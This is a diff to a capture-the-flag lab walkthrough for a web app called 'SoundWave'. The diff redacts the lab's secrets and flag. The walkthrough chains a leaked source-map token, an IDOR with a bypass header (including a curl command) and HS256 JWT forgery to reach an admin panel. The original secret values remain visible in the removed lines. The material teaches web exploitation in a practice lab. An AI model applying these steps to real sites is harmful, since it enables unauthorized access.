@@ -1,12 +1,5 @@
 # SoundWave: Solution Walkthrough & Hardening Guide
 
-* **Lab Name:** SoundWave
-* **Difficulty:** Medium
-* **Category:** Web Exploitation
-* **Points:** 30
-* **GCP Image Name:** `sound-wave`
-* **Vulnerability Vectors:** Client-side Webpack Source Map Exposure, Insecure Direct Object Reference (IDOR), Weak Environment configurations (Hardcoded Bypass Token & Leaked JWT Secret), JWT Session Forgery.
-
 ---
 
 ## 🗺️ Vulnerability Chain Summary
@@ -14,9 +7,9 @@
 ```mermaid
 graph TD
     A[Phase 1: Web Player Port 80] -->|Inspect Sources Tab / Chunk Map| B(Leaked dev-defaults.ts)
-    B -->|Extract bypass token| C[SOUNDWAVE_DEV_BYPASS_TOKEN = AudioM@ster2026]
+    B -->|Extract bypass token| C[SOUNDWAVE_DEV_BYPASS_TOKEN = [REDACTED]]
     C -->|Replay GET /api/v1/episodes/view?id=100| D{Phase 2: IDOR with Bypass Header}
-    D -->|Extract JWT secret| E[JWT_SECRET = soundwave_local_secret_dont_share]
+    D -->|Extract JWT secret| E[JWT_SECRET = [REDACTED]]
     E -->|Forge HS256 JWT claim role: editor| F{Phase 3: JWT Forgery}
     F -->|POST /api/v1/admin/verify| G[Flag Captured: VulnOS{...}]
 ```
@@ -38,11 +31,11 @@ graph TD
    
    The unminified file reveals hardcoded developer settings:
    ```typescript
-   export const SOUNDWAVE_DEV_BYPASS_TOKEN = "AudioM@ster2026";
+   export const SOUNDWAVE_DEV_BYPASS_TOKEN = "[REDACTED]";
    export const STAGING_API_ENDPOINT = "http://localhost:5000/api/v1";
    export const DEBUG_MODE = true;
    ```
-   Save the bypass token value: `AudioM@ster2026`.
+   Save the bypass token value: `[REDACTED]`.
 
 ---
 
@@ -65,11 +58,11 @@ graph TD
    ```
 
 3. **Bypassing Access Control:**
-   Using the token discovered in Phase 1 (`AudioM@ster2026`), replay the request adding the `X-Bypass-Token` header.
+   Using the token discovered in Phase 1 (`[REDACTED]`), replay the request adding the `X-Bypass-Token` header.
    
    **cURL Command:**
    ```bash
-   curl -H "X-Bypass-Token: AudioM@ster2026" "http://<TARGET_IP>/api/v1/episodes/view?id=100"
+   curl -H "X-Bypass-Token: [REDACTED]" "http://<TARGET_IP>/api/v1/episodes/view?id=100"
    ```
 
    **JSON Response:**
@@ -79,14 +72,14 @@ graph TD
      "id": 100,
      "title": "[INTERNAL ONLY] SoundWave Dev Test Stream",
      "artist": "Staging Pipeline",
-     "description": "[STAGING CONF] System testing normalized master stream. Bypass Verification Token validation successful. Internal Config: JWT_SECRET=soundwave_local_secret_dont_share. Do not share this key in production builds.",
+     "description": "[STAGING CONF] System testing normalized master stream. Bypass Verification Token validation successful. Internal Config: JWT_SECRET=[REDACTED]. Do not share this key in production builds.",
      "duration": "0:30",
      "coverUrl": "/images/cover_100.jpg",
      "audioUrl": "/audio/dev_stream.mp3",
      "isPrivate": true
    }
    ```
-   Save the leaked JWT signing key: `soundwave_local_secret_dont_share`.
+   Save the leaked JWT signing key: `[REDACTED]`.
 
 ---
 
@@ -112,10 +105,10 @@ graph TD
        "role": "editor"
      }
      ```
-   * **Signature Key:** `soundwave_local_secret_dont_share`
+   * **Signature Key:** `[REDACTED]`
 
    *Example Forged JWT:*
-   `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImVkaXRvciJ9.R2Bw...`
+   `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImVkaXRvciJ9.[REDACTED]`
 
 3. **Submitting the JWT:**
    * **Option A:** Paste the forged JWT directly into the text input box on `http://<TARGET_IP>/admin/analytics` and click **"Authorize Session"**.
@@ -128,7 +121,7 @@ graph TD
 
 4. **Capturing the Flag:**
    Upon validation, the analytics interface unlocks, revealing the flag:
-   `VulnOS{s0und_w4v3_s0urc3map_1d0r_jwt_3xpl01t}`
+   `VulnOS{[REDACTED]}`
 
 ---
 
